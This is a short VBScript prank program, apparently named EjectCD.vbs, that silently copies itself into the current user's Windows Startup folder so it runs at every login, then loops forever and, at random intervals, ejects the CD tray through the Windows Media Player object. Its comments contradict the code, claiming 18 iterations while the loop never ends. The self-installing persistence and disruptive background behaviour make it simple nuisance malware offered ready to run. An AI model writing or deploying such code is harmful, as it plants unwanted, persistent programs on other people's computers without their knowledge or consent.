Randomize
Dim wshShell
Set wshShell = CreateObject("Wscript.Shell")

' Get the current user's username
Dim username
username = wshShell.ExpandEnvironmentStrings("%USERNAME%")

' Define the source and target paths
Dim sSourceFile
sSourceFile = "EjectCD.vbs"  ' Replace with the actual path to your script
Dim sTargetFolder
sTargetFolder = "C:\Users\" & username & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

' Check if the file is already in the startup folder
If Not FileExists(sTargetFolder & "\" & "EjectCD.vbs") Then
    ' File doesn't exist in startup folder, so copy it
    Dim sCmd
    sCmd = "%comspec% /c copy """ & sSourceFile & """ """ & sTargetFolder & """ /Y"
    wshShell.Run sCmd, 0, True
Else
   
End If

Function FileExists(sFilePath)
    Dim objFSO
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    FileExists = objFSO.FileExists(sFilePath)
    Set objFSO = Nothing
End Function

' Execute the loop for 18 iterations (30 seconds each)
Set shell = CreateObject("WScript.Shell")

Do
    ' Sleep for 20 seconds
    WScript.Sleep 20000

    ' Generate a random number between 0 and 1
    randomValue = Rnd()

    ' Execute an action with a 5% chance
    If randomValue < 0.05 Then
       Set oWMP = CreateObject("WMPlayer.OCX.7" )
    oWMP.cdromCollection.Item(0).Eject
    set owmp = nothing  
    End If
    Loop
wscript.quit